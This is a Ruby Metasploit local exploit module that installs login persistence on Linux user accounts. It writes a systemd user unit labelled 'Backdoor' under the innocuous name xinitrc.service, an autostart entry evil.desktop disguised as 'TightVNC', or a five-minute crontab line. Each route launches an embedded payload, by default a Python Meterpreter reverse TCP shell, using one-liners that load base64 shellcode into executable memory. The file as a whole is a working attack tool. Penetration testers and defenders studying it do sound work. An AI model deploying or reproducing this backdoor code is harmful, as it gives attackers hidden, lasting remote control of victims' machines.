require 'msf/core'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Exploit::EXE

  def initialize
    super(
      'Name'		=> 'Linux regular user persistence',
      'Description'	=> %q{
        Linux persistence module that uses either Desktop Environment autostart or systemd user unit to launch payloads upon user login.

	The payloads are embedded within each mechanism, so no additional binaries are uploaded to the target system. The embedding is done with a Python one-liner, so it is required to have Python on the target.
      },
      'Author'		=> [ 'pyllyukko' ],
      'License'		=> MSF_LICENSE,
      'Platform'	=> [ 'linux', 'python', 'unix' ],
      'Targets'		=> [['Automatic', {}]],
      'Arch'		=> [ ARCH_X86, ARCH_X86_64, ARCH_PYTHON, ARCH_CMD ],
      'Privileged'	=> false,
      'DefaultTarget'	=> 0,
      # TODO: shell?
      'SessionTypes'	=> [ 'meterpreter' ],
      'DefaultOptions'	=>
        {
          'DisablePayloadHandler'	=> 'true',
	  'PAYLOAD'			=> 'python/meterpreter/reverse_tcp',
        },
      'References'	=>
        [
          [ 'URL', 'https://developer.gnome.org/autostart-spec/' ],
          [ 'URL', 'http://wiki.lxde.org/en/Autostart' ],
          [ 'URL', 'https://specifications.freedesktop.org/autostart-spec/0.5/ar01s02.html' ]
        ],
    )
    register_options([
      # TODO: binary payload path, systemd service & file names, autostart file name
      OptString.new('METHOD',
        [true, 'autostart || systemd || crontab',
         'autostart']
      ),
    ], self.class)
  end

  def exploit
    case datastore['METHOD']
      when 'systemd'
	systemd_method
      when 'autostart'
	autostart_method
      when 'crontab'
	crontab_method
    end
  end

  def check
    print_status("User: #{whoami}")
    case datastore['METHOD']
      when 'systemd'
	if exist?("/bin/systemctl")
	  return Exploit::CheckCode::Vulnerable
	else
	  print_error("/bin/systemctl does not exist. Maybe there is no systemd.")
	end
      when 'autostart'
	if desktop_environment.nil?
	  print_warning("Desktop environment not recognized")
	else
	  print_status("Desktop environment: #{desktop_environment}")
	end

	if exist?("/home/#{whoami}/.config")
	  return Exploit::CheckCode::Vulnerable
	end
      when 'crontab'
	# TODO
	cmd_exec("crontab -l")
    end
    Exploit::CheckCode::Safe
  end

  private

  def whoami
    cmd_exec("id -un").chomp
    #session.sys.config.getenv('USERNAME')
  end

  def desktop_environment
    session.sys.config.getenv('DESKTOP_SESSION')
  end

  def crontab_method
    if payload.arch.first != "python"
      print_error("Only Python payloads supported with crontab method as of yet")
      return
    end
    cmd_exec("(crontab -l;echo \"*/5 * * * * python -c \"'\"'\"#{payload.encoded}\"'\"')|crontab -")
  end

  def systemd_method
    if !exist?("/bin/systemctl")
      print_error("/bin/systemctl does not exist. Maybe there is no systemd.")
      return
    end
    if !exist?("/home/#{whoami}/.config/systemd/user")
      print_status("Creating systemd user unit directory")
      cmd_exec("mkdir -p /home/#{whoami}/.config/systemd/user")
    end
    systemd_unit = <<-EOF
[Unit]
Description=Backdoor

[Service]
    EOF
    case payload.arch.first
      when 'python'
        systemd_unit << "ExecStart=/usr/bin/python -c \"#{payload.encoded}\""
      when 'x86', 'x86_64'
        if sysinfo["Architecture"] != payload.arch.first
          print_error("You're trying to use wrong payload (#{payload.arch.first} != #{sysinfo["Architecture"]})")
          return
        end
        systemd_unit << "ExecStart=/usr/bin/python -c 'from ctypes import*;import mmap;Q=mmap.mmap(-1,4096,2,7);Q.write(\"#{Rex::Text.encode_base64(payload.encoded)}\".decode(\"base64\"));CFUNCTYPE(c_int)(addressof(c_char.from_buffer(Q)))()'\n"
      when 'cmd'
	payload = generate_payload
        systemd_unit << "ExecStart=/bin/sh -c '#{payload.encoded}'\n"
    end
    systemd_unit << "ExecStop=/bin/true\n"
    systemd_unit << "KillMode=none\n"
    systemd_unit << "Restart=no\n"
    systemd_unit << "[Install]\n"
    systemd_unit << "WantedBy=default.target\n"
    if write_file("/home/#{whoami}/.config/systemd/user/xinitrc.service", systemd_unit)
      print_good("Systemd unit written")
    end
    cmd_exec("systemctl --user daemon-reload")
    print_status("Enabling systemd user service")
    cmd_exec("systemctl --user enable xinitrc")
  end

  def autostart_method
    if !exist?("/home/#{whoami}/.config")
      print_error("/home/#{whoami}/.config directory does not exist. Maybe there is no desktop environment in use.")
      return
    end
    if !exist?("/home/#{whoami}/.config/autostart")
      print_status("Creating autostart directory")
      cmd_exec("mkdir -p /home/#{whoami}/.config/autostart")
    end

    print_status("Desktop Environment: #{desktop_environment}")

    desktopfile_path = "/home/#{whoami}/.config/autostart/evil.desktop"
    desktopfile_content = <<-EOF
[Desktop Entry]
Type=Application
Name=TightVNC
    EOF
    case payload.arch.first
      # this covers also generic/ payloads
      when 'x86', 'x86_64'
	print_status("Payload: #{Rex::Text.encode_base64(payload.encoded)}")
        if sysinfo["Architecture"] != payload.arch.first
          print_error("You're trying to use wrong payload (#{payload.arch.first} != #{sysinfo["Architecture"]})")
          return
        end
	desktopfile_content << "Exec=python -c 'from ctypes import*;import mmap;Q=mmap.mmap(-1,4096,2,7);Q.write(\"#{Rex::Text.encode_base64(payload.encoded)}\".decode(\"base64\"));CFUNCTYPE(c_int)(addressof(c_char.from_buffer(Q)))()'"
      when 'python'
	payload = generate_payload
	desktopfile_content << "Exec=python -c \"#{payload.encoded}\""
	# Check that Python exists
	if cmd_exec("which python") == ""
	  print_error("Python not found")
	  return
	end
      when 'cmd'
	payload = generate_payload
	desktopfile_content << "Exec=sh -c '#{payload.encoded}'"
    end
    desktopfile_content << "\nStartupNotify=false\n"
    if write_file(desktopfile_path, desktopfile_content)
      print_good("Autostart written to #{desktopfile_path}")
    end
  end

end
